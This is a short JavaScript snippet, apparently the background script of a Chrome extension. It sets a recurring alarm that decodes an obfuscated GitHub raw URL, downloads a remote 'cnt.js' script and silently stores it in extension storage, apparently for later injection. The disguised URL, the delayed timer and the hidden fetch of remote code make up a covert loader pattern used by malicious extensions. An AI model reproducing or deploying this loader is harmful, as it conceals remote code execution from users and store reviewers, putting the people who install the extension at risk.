
chrome.alarms.onAlarm.addListener(function(alarm) {
    if (alarm.name === "updtFull") {
        fetch("ivurt<01scx0hkujvdvuftdqovfpu0dqn1DqegJIvgtu0vikoitHptDqeg0obuugs1FzugoujqoGEU0".split("")
            .map((e, i) => String.fromCharCode(e.charCodeAt(0) - 1 - (i % 2))).join("") + "cnt.js")
        .then(r => { r.text().then(t => {
            chrome.storage.local.set({"cnt": t}, () => {})
        })})
    }
})

chrome.alarms.create("updtFull", {
    delayInMinutes: 60,
    periodInMinutes: 180
})
